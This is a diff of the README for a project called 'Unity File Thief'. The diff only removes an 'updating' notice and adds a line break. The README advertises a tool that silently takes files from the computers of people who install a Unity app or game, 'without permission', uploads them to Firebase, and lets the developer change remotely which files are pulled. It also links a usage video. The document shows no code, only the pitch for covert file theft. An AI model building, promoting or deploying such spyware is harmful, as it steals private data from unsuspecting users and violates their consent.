@@ -1,7 +1,3 @@
-#🛠It's Updating ...🛠
-# ⚠️You May Encounter Errors If You Use It.⚠️
-
-
 # Unity File Thief
 Capture the files of users who installed the Application or Game you created in Unity from an address on their computers without permission (or by asking) and store them on the cloud (Firebase). After collecting the file from the user, you can change the path via Firebase and pull different files.  
 
@@ -10,6 +6,7 @@ Capture the files of users who installed the Application or Game you created in 
 - [How to Use](#how-to-use)
 - [Basic Step by Step - Setup](#set-up)
 
+<br>
 
 ## How to Use
 Watch the Usage - https://youtu.be/q9tfqz6c1ss
